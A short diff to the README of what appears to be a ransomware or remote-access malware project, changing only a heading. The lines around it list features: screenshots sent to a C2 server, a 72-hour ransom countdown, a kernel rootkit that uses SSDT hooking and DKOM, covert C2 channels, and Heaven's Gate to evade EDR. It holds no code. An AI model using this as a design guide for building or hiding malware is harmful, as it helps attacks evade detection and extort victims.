@@ -126,7 +126,7 @@ cargo run
 - **Screenshot Capture**: Desktop screenshots sent to C2 server
 - **Countdown Timer**: Fullscreen HTML timer with 72-hour deadline display
 
-### EXTREME Evasion Features (โหดสุด)
+### EXTREME Evasion Features
 - **Kernel-Level Rootkit**: SSDT hooking for system call interception, DKOM for process/file hiding, signed driver loading for kernel persistence
 - **Multi-Channel C2**: Redundant communication using DNS tunneling, ICMP packets, domain fronting via CDNs, and covert channels in social media
 - **Heaven's Gate Bypass**: 32-bit to 64-bit syscall transitions to evade EDR syscall monitoring
